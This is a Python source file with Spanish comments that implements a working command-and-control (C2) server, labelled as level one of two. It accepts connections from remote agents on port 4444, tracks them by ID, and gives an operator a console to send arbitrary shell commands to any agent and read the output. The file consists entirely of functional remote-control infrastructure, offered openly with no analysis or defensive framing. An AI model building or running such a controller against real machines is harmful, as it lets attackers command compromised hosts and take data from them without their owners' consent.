"""
Servidor C2 - Nivel 1/2
Acepta conexiones de múltiples agentes, permite al operador
elegir un agente y mandarle comandos, recibe y muestra resultados.

Protocolo: JSON, un mensaje por línea (newline-delimited JSON).
"""

import socket
import threading
import json
import uuid
import os
import sys

HOST = "0.0.0.0"
PORT = int(os.getenv("PORT", 4444))  # Puerto configurable vía variable de entorno

# Diccionario de agentes conectados: {agent_id: socket}
agents = {}
agents_lock = threading.Lock()


def send_json(sock, data: dict):
    """Envía un dict como JSON terminado en newline."""
    msg = json.dumps(data) + "\n"
    sock.sendall(msg.encode())


def recv_json(sock, buffer: str):
    """
    Lee del socket hasta tener al menos un mensaje completo (newline).
    Devuelve (mensaje_dict_o_None, buffer_restante).
    """
    while "\n" not in buffer:
        chunk = sock.recv(4096)
        if not chunk:
            return None, buffer  # conexión cerrada
        buffer += chunk.decode(errors="ignore")
    line, buffer = buffer.split("\n", 1)
    if not line.strip():
        return {}, buffer
    return json.loads(line), buffer


def handle_agent(conn, addr):
    """Hilo dedicado a cada agente conectado."""
    buffer = ""
    agent_id = None
    try:
        # Esperamos el mensaje de registro inicial ("hello")
        msg, buffer = recv_json(conn, buffer)
        if msg and msg.get("type") == "hello":
            agent_id = msg.get("agent_id", str(uuid.uuid4())[:8])
            with agents_lock:
                agents[agent_id] = conn
            print(f"[+] Agente conectado: {agent_id} desde {addr} ({msg.get('hostname')})")

        # Loop principal: escuchar resultados que manda el agente
        while True:
            msg, buffer = recv_json(conn, buffer)
            if msg is None:
                break  # agente se desconectó
            if msg.get("type") == "result":
                print(f"\n[resultado de {agent_id}] (id={msg.get('id')}):")
                print(msg.get("output"))
                print(f"> ", end="", flush=True)  # repinta el prompt del operador

    except (ConnectionResetError, json.JSONDecodeError) as e:
        print(f"[!] Error con agente {agent_id}: {e}")
    finally:
        if agent_id:
            with agents_lock:
                agents.pop(agent_id, None)
            print(f"\n[-] Agente desconectado: {agent_id}")


def operator_console():
    """Consola simple para que el operador mande comandos."""
    print("Consola de operador. Comandos:")
    print("  list                  -> lista agentes conectados")
    print("  use <agent_id> <cmd>  -> manda un comando a un agente")
    print("  use @agent <cmd>      -> usa el único agente (si solo hay uno)")
    print("  exit                  -> salir\n")

    while True:
        try:
            line = input("> ").strip()
        except EOFError:
            break

        if line == "list":
            with agents_lock:
                if not agents:
                    print("(sin agentes conectados)")
                for aid in agents:
                    print(f" - {aid}")

        elif line.startswith("use "):
            parts = line.split(" ", 2)
            if len(parts) < 3:
                print("Uso: use <agent_id> <comando>")
                print("     use @agent <comando>  (usa el único agente si solo hay uno)")
                continue
            _, agent_id, command = parts
            
            # Si usa @agent, auto-selecciona el único agente conectado
            if agent_id == "@agent":
                with agents_lock:
                    if len(agents) == 0:
                        print("Error: No hay agentes conectados")
                        continue
                    elif len(agents) == 1:
                        agent_id = list(agents.keys())[0]
                        print(f"[auto-seleccionado] {agent_id}")
                    else:
                        print(f"Error: Hay {len(agents)} agentes conectados. Especifica uno:")
                        for aid in agents:
                            print(f" - {aid}")
                        continue
            
            with agents_lock:
                conn = agents.get(agent_id)
            if not conn:
                print(f"Agente '{agent_id}' no encontrado")
                continue
            msg_id = str(uuid.uuid4())[:8]
            send_json(conn, {"type": "cmd", "id": msg_id, "command": command})
            print(f"[enviado] id={msg_id} -> {agent_id}: {command}")

        elif line == "exit":
            break


def main():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((HOST, PORT))
    server_sock.listen(5)
    print(f"[*] Servidor C2 escuchando en {HOST}:{PORT}")

    def accept_loop():
        while True:
            conn, addr = server_sock.accept()
            t = threading.Thread(target=handle_agent, args=(conn, addr), daemon=True)
            t.start()

    threading.Thread(target=accept_loop, daemon=True).start()
    operator_console()


if __name__ == "__main__":
    main()
